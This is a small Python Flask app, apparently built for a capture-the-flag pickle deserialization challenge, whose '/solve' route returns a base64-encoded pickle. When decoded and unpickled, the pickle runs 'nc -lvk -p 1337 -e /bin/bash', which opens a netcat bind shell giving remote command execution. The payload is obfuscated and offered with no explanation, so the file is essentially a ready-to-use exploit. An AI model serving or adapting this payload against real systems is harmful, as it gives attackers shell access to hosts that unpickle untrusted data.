from flask import request, Flask
import os, base64, pickle

app = Flask(__name__)

@app.route('/solve', methods=['GET'])
def login():
    if request.method == 'GET':
        return 'gANjcG9zaXgKc3lzdGVtCnEAWBwAAABuYyAtbHZrIC1wIDEzMzcgLWUgL2Jpbi9iYXNocQGFcQJScQMu'
